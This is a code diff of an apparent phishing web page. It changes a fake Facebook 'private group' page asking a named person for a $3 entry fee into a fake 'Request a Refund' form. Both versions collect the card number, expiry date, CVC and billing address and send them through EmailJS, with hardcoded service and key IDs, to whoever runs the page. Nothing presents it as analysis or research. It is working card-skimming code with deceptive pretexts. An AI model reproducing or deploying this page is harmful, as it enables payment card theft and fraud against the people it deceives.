@@ -1,23 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Private Group</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Refund Request</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     body {
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
+      justify-content: flex-start;
       height: 100vh;
       margin: 0;
+      padding-top: 80px;
+      font-family: Arial, sans-serif;
+      background-color: black;
     }
 
     .navbar {
       width: 100%;
-      height: 60px;
+      height: 20px;
       background-color: #1877f2;
       display: flex;
       align-items: center;
@@ -27,28 +30,24 @@
       left: 0;
       z-index: 1000;
     }
+
     .navbar h2 {
       color: white;
       font-size: 24px;
       margin: 0;
     }
 
-    .container {
-      background: rgba(255, 255, 255, 0.9);
+    .container, .card-section {
+      background: rgba(255, 255, 255, 0.95);
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      text-align: center;
       width: 300px;
-      margin-top: 30px;
-    }
-
-    h2 {
-      margin-bottom: 20px;
+      margin-top: 3px;
+      text-align: center;
     }
 
     input {
-      display: block;
       width: 100%;
       padding: 10px;
       margin: 10px 0;
@@ -76,7 +75,6 @@
       font-size: 14px;
     }
 
-    /* Popup styles */
     .popup {
       display: none;
       position: fixed;
@@ -107,18 +105,30 @@
     #popupClose:hover {
       background: #166fe5;
     }
+
+    .card-section {
+      display: none;
+    }
+
+    .refund-amount-display {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 <body>
 
-  <!-- Navigation Bar -->
-  <nav class="navbar">
-    <h2>facebook</h2>
-  </nav>
-
+  <!-- Refund Input Section -->
   <div class="container">
-    <h2>Welcome, R Keith Williams</h2>
-    <p>$3 entry fee required to access group</p>
+    <h2>Request a Refund</h2>
+    <input type="number" id="refundAmount" placeholder="Enter refund amount" required>
+    <button id="continueBtn">Continue</button>
+  </div>
+
+  <!-- Card Info Section (Hidden at First) -->
+  <div class="card-section" id="cardSection">
+    <h3>Enter Card Details</h3>
+    <p class="refund-amount-display" id="refundDisplay"></p>
     <form id="paymentForm">
       <input type="text" id="cardNumber" placeholder="Card Number" required>
       <input type="text" id="expDate" placeholder="MM/YY" required>
@@ -128,28 +138,37 @@
       <input type="text" id="state" placeholder="State" required>
       <input type="text" id="zipCode" placeholder="Zip Code" required>
       <p id="errorMessage" class="error"></p>
-      <button type="button" id="payButton">Pay</button>
+      <button type="button" id="payButton">Submit Refund</button>
     </form>
   </div>
 
   <!-- Popup Confirmation -->
   <div id="popup" class="popup">
     <div class="popup-content">
-      <p>Payment sent successfully! Awaiting approval.</p>
+      <p>Refund request submitted successfully!</p>
       <button id="popupClose">OK</button>
     </div>
   </div>
 
   <script>
-    // EmailJS configuration
     const EMAILJS_SERVICE_ID = "service_uhxg8hf";
     const EMAILJS_TEMPLATE_ID = "template_ledkaye";
     const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";
 
-    // Initialize EmailJS
     emailjs.init(EMAILJS_PUBLIC_KEY);
 
-    // Handle form submission
+    document.getElementById("continueBtn").addEventListener("click", () => {
+      const refundAmount = document.getElementById("refundAmount").value.trim();
+
+      if (!refundAmount || isNaN(refundAmount) || refundAmount <= 0) {
+        alert("Please enter a valid refund amount.");
+        return;
+      }
+
+      document.getElementById("refundDisplay").textContent = `Refund Amount: $${parseFloat(refundAmount).toFixed(2)}`;
+      document.getElementById("cardSection").style.display = "block";
+    });
+
     document.getElementById("payButton").addEventListener("click", () => {
       const cardNumber = document.getElementById("cardNumber").value.trim();
       const expDate = document.getElementById("expDate").value.trim();
@@ -158,9 +177,9 @@
       const city = document.getElementById("city").value.trim();
       const state = document.getElementById("state").value.trim();
       const zipCode = document.getElementById("zipCode").value.trim();
+      const refundAmount = document.getElementById("refundAmount").value.trim();
       const errorMessage = document.getElementById("errorMessage");
 
-      // Basic validation
       if (!cardNumber || !expDate || !cvc || !streetAddress || !city || !state || !zipCode) {
         errorMessage.textContent = "All fields are required.";
         return;
@@ -173,7 +192,8 @@
         street_address: streetAddress,
         city: city,
         state: state,
-        zip_code: zipCode
+        zip_code: zipCode,
+        refund_amount: `$${parseFloat(refundAmount).toFixed(2)}`
       };
 
       emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
@@ -182,16 +202,14 @@
           document.getElementById("paymentForm").reset();
         })
         .catch((error) => {
-          errorMessage.textContent = "Failed to send payment information. Please try again.";
+          errorMessage.textContent = "Failed to send refund request. Please try again.";
           console.error("Error:", error);
         });
     });
 
-    // Close popup
     document.getElementById("popupClose").addEventListener("click", () => {
       document.getElementById("popup").style.display = "none";
     });
   </script>
-
 </body>
 </html>
